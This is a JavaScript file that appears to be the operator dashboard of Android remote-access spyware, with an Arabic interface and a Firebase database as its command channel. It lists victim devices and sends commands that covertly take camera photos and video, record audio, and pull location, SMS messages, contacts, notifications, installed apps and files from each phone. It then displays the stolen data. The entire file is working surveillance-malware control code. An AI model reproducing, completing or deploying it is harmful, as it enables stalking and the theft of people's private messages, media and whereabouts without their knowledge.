// Global variables
let selectedDeviceId = null;
let devicesListener = null;
let commandsListener = null;

// Initialize app
document.addEventListener('DOMContentLoaded', function() {
    loadDevices();
});

// Load all devices
function loadDevices() {
    const devicesList = document.getElementById('devicesList');
    devicesList.innerHTML = '<div class="loading">جاري التحميل...</div>';
    
    if (devicesListener) {
        db.ref('devices').off('value', devicesListener);
    }
    
    devicesListener = db.ref('devices').on('value', (snapshot) => {
        const devices = snapshot.val();
        devicesList.innerHTML = '';
        
        if (!devices) {
            devicesList.innerHTML = '<div class="no-devices">لا توجد أجهزة متصلة</div>';
            document.getElementById('deviceCount').textContent = '0 أجهزة متصلة';
            return;
        }
        
        const devicesArray = Object.keys(devices).map(id => ({
            id,
            ...devices[id]
        }));
        
        document.getElementById('deviceCount').textContent = `${devicesArray.length} ${devicesArray.length === 1 ? 'جهاز' : 'أجهزة'} متصلة`;
        
        devicesArray.forEach(device => {
            const deviceElement = createDeviceElement(device);
            devicesList.appendChild(deviceElement);
        });
    });
}

// Create device list item
function createDeviceElement(device) {
    const div = document.createElement('div');
    div.className = `device-item ${device.status === 'online' ? 'online' : 'offline'}`;
    if (selectedDeviceId === device.id) {
        div.classList.add('selected');
    }
    
    const deviceName = device.info?.model || device.info?.device || 'جهاز غير معروف';
    const lastSeen = device.lastSeen ? formatTime(device.lastSeen) : '-';
    
    div.innerHTML = `
        <div class="device-icon">${device.status === 'online' ? '🟢' : '🔴'}</div>
        <div class="device-details">
            <div class="device-name">${deviceName}</div>
            <div class="device-time">${lastSeen}</div>
        </div>
    `;
    
    div.onclick = () => selectDevice(device.id);
    
    return div;
}

// Select a device
function selectDevice(deviceId) {
    selectedDeviceId = deviceId;
    
    // Update UI
    document.querySelectorAll('.device-item').forEach(el => el.classList.remove('selected'));
    event.currentTarget.classList.add('selected');
    
    document.getElementById('noDeviceSelected').style.display = 'none';
    document.getElementById('deviceControl').style.display = 'block';
    
    // Load device details
    loadDeviceDetails(deviceId);
    
    // Listen for command responses
    listenForCommands(deviceId);
}

// Load device details
function loadDeviceDetails(deviceId) {
    db.ref(`devices/${deviceId}`).on('value', (snapshot) => {
        const device = snapshot.val();
        if (!device) return;
        
        const deviceName = device.info?.manufacturer + ' ' + device.info?.model || 'جهاز غير معروف';
        document.getElementById('deviceName').textContent = deviceName;
        
        const statusEl = document.getElementById('deviceStatus');
        statusEl.textContent = device.status === 'online' ? 'متصل' : 'غير متصل';
        statusEl.className = `status ${device.status}`;
        
        document.getElementById('deviceBattery').textContent = device.info?.batteryLevel ? `${device.info.batteryLevel}%` : '-';
        document.getElementById('deviceLastSeen').textContent = device.lastSeen ? formatTime(device.lastSeen) : '-';
    });
}

// Listen for command responses
function listenForCommands(deviceId) {
    if (commandsListener) {
        commandsListener.off();
    }
    
    commandsListener = db.ref(`devices/${deviceId}/commands`).on('child_changed', (snapshot) => {
        const command = snapshot.val();
        if (command.status === 'completed' && command.result) {
            handleCommandResult(command.type, command.result);
        } else if (command.status === 'failed') {
            showError(command.error || 'فشل تنفيذ الأمر');
        }
    });
}

// Send command to device
function sendCommand(type, data = {}) {
    if (!selectedDeviceId) {
        alert('الرجاء اختيار جهاز أولاً');
        return;
    }
    
    const commandId = 'cmd_' + Date.now();
    const command = {
        type,
        ...data,
        status: 'pending',
        createdAt: Date.now()
    };
    
    db.ref(`devices/${selectedDeviceId}/commands/${commandId}`).set(command);
    
    showLoading(`جاري تنفيذ ${getCommandName(type)}...`);
}

// Get location
function getLocation() {
    sendCommand('get_location');
}

// Take photo
function takePhoto(camera) {
    sendCommand('take_photo', { camera });
}

// Start video recording
function startVideo(camera) {
    sendCommand('start_video', { camera });
}

// Stop video recording
function stopVideo() {
    sendCommand('stop_video');
}

// Record audio
function recordAudio() {
    const duration = parseInt(document.getElementById('audioDuration').value) || 30;
    sendCommand('record_audio', { duration });
}

// Get SMS
function getSms() {
    sendCommand('get_sms');
}

// Get contacts
function getContacts() {
    sendCommand('get_contacts');
}

// Get notifications
function getNotifications() {
    sendCommand('get_notifications');
}

// List files
function listFiles() {
    const path = document.getElementById('filePath').value || '/';
    sendCommand('list_files', { path });
}

// Download file
function downloadFile(path) {
    sendCommand('download_file', { path });
}

// Get apps
function getApps() {
    sendCommand('get_apps');
}

// Handle command results
function handleCommandResult(type, result) {
    switch(type) {
        case 'get_location':
            showLocationResult(result);
            break;
        case 'take_photo':
        case 'start_video':
        case 'stop_video':
            showMediaResult(result);
            break;
        case 'record_audio':
            showAudioResult(result);
            break;
        case 'get_sms':
            showSmsResult(result);
            break;
        case 'get_contacts':
            showContactsResult(result);
            break;
        case 'get_notifications':
            showNotificationsResult(result);
            break;
        case 'list_files':
            showFilesResult(result);
            break;
        case 'download_file':
            showDownloadResult(result);
            break;
        case 'get_apps':
            showAppsResult(result);
            break;
    }
}

// Show location result
function showLocationResult(result) {
    const container = document.getElementById('locationResult');
    container.innerHTML = `
        <div class="success-message">
            <h4>✅ تم الحصول على الموقع</h4>
            <p><strong>خط العرض:</strong> ${result.latitude}</p>
            <p><strong>خط الطول:</strong> ${result.longitude}</p>
            <p><strong>الدقة:</strong> ${result.accuracy}m</p>
            <a href="https://www.google.com/maps?q=${result.latitude},${result.longitude}" 
               target="_blank" class="btn-primary">فتح في خرائط Google</a>
        </div>
    `;
    
    // Show map
    const mapContainer = document.getElementById('mapContainer');
    const mapFrame = document.getElementById('mapFrame');
    mapFrame.src = `https://maps.google.com/maps?q=${result.latitude},${result.longitude}&output=embed`;
    mapContainer.style.display = 'block';
}

// Show media result
function showMediaResult(result) {
    const container = document.getElementById('cameraResult');
    if (result.url) {
        container.innerHTML = `
            <div class="success-message">
                <h4>✅ تم التقاط ${result.camera === 'front' ? 'الكاميرا الأمامية' : 'الكاميرا الخلفية'}</h4>
                <img src="${result.url}" alt="Photo" class="media-preview">
                <a href="${result.url}" download class="btn-primary">تحميل</a>
            </div>
        `;
    } else {
        container.innerHTML = `<div class="info-message">جاري التسجيل...</div>`;
    }
}

// Show audio result
function showAudioResult(result) {
    const container = document.getElementById('audioResult');
    container.innerHTML = `
        <div class="success-message">
            <h4>✅ تم التسجيل (${result.duration} ثانية)</h4>
            <audio controls src="${result.url}"></audio>
            <a href="${result.url}" download class="btn-primary">تحميل</a>
        </div>
    `;
}

// Show SMS result
function showSmsResult(result) {
    const container = document.getElementById('dataResult');
    const smsList = result.sms || [];
    
    let html = `<h4>الرسائل (${result.count})</h4><div class="data-list">`;
    
    smsList.slice(0, 50).forEach(sms => {
        html += `
            <div class="data-item">
                <strong>${sms.address}</strong>
                <p>${sms.body}</p>
                <small>${formatTime(sms.date)}</small>
            </div>
        `;
    });
    
    html += '</div>';
    container.innerHTML = html;
}

// Show contacts result
function showContactsResult(result) {
    const container = document.getElementById('dataResult');
    const contacts = result.contacts || [];
    
    let html = `<h4>جهات الاتصال (${result.count})</h4><div class="data-list">`;
    
    contacts.forEach(contact => {
        const phones = contact.phones ? contact.phones.join(', ') : 'لا يوجد';
        html += `
            <div class="data-item">
                <strong>${contact.name}</strong>
                <p>${phones}</p>
            </div>
        `;
    });
    
    html += '</div>';
    container.innerHTML = html;
}

// Show notifications result
function showNotificationsResult(result) {
    const container = document.getElementById('dataResult');
    const notifications = result.notifications || [];
    
    let html = `<h4>الإشعارات (${result.count})</h4><div class="data-list">`;
    
    notifications.slice(0, 50).forEach(notif => {
        html += `
            <div class="data-item">
                <strong>${notif.title}</strong>
                <p>${notif.text}</p>
                <small>${notif.package} - ${formatTime(notif.time)}</small>
            </div>
        `;
    });
    
    html += '</div>';
    container.innerHTML = html;
}

// Show files result
function showFilesResult(result) {
    const container = document.getElementById('filesResult');
    const files = result.files || [];
    
    let html = `<div class="file-breadcrumb">${result.currentPath}</div><div class="files-grid">`;
    
    files.forEach(file => {
        const icon = file.isDirectory ? '📁' : '📄';
        const size = file.isDirectory ? '' : formatBytes(file.size);
        
        html += `
            <div class="file-item" onclick="${file.isDirectory ? `document.getElementById('filePath').value='${file.path}'; listFiles()` : `downloadFile('${file.path}')`}">
                <div class="file-icon">${icon}</div>
                <div class="file-name">${file.name}</div>
                <div class="file-size">${size}</div>
            </div>
        `;
    });
    
    html += '</div>';
    container.innerHTML = html;
}

// Show download result
function showDownloadResult(result) {
    const container = document.getElementById('filesResult');
    container.innerHTML = `
        <div class="success-message">
            <h4>✅ تم رفع الملف</h4>
            <p>${result.path}</p>
            <a href="${result.url}" download class="btn-primary">تحميل</a>
        </div>
    `;
}

// Show apps result
function showAppsResult(result) {
    const container = document.getElementById('appsResult');
    const apps = result.apps || [];
    
    let html = `<h4>التطبيقات المثبتة (${result.count})</h4><div class="data-list">`;
    
    apps.forEach(app => {
        html += `
            <div class="data-item">
                <strong>${app.appName}</strong>
                <p>${app.packageName}</p>
                <small>الإصدار: ${app.versionName} | ${app.isSystemApp ? 'تطبيق نظام' : 'تطبيق مستخدم'}</small>
            </div>
        `;
    });
    
    html += '</div>';
    container.innerHTML = html;
}

// Switch tabs
function switchTab(tabName) {
    document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
    document.querySelectorAll('.tab-panel').forEach(panel => panel.classList.remove('active'));
    
    event.currentTarget.classList.add('active');
    document.getElementById(tabName + 'Tab').classList.add('active');
}

// Refresh devices
function refreshDevices() {
    loadDevices();
}

// Logout
function logout() {
    if (confirm('هل تريد تسجيل الخروج؟')) {
        window.location.reload();
    }
}

// Utility functions
function formatTime(timestamp) {
    const date = new Date(timestamp);
    const now = new Date();
    const diff = now - date;
    
    if (diff < 60000) return 'الآن';
    if (diff < 3600000) return `${Math.floor(diff / 60000)} دقيقة`;
    if (diff < 86400000) return `${Math.floor(diff / 3600000)} ساعة`;
    
    return date.toLocaleString('ar-EG');
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
}

function getCommandName(type) {
    const names = {
        'get_location': 'الحصول على الموقع',
        'take_photo': 'التقاط صورة',
        'start_video': 'بدء تسجيل فيديو',
        'stop_video': 'إيقاف التسجيل',
        'record_audio': 'تسجيل صوت',
        'get_sms': 'قراءة الرسائل',
        'get_contacts': 'جهات الاتصال',
        'get_notifications': 'الإشعارات',
        'list_files': 'عرض الملفات',
        'download_file': 'تحميل ملف',
        'get_apps': 'التطبيقات'
    };
    return names[type] || type;
}

function showLoading(message) {
    // Implementation for loading indicator
}

function showError(message) {
    alert('خطأ: ' + message);
}
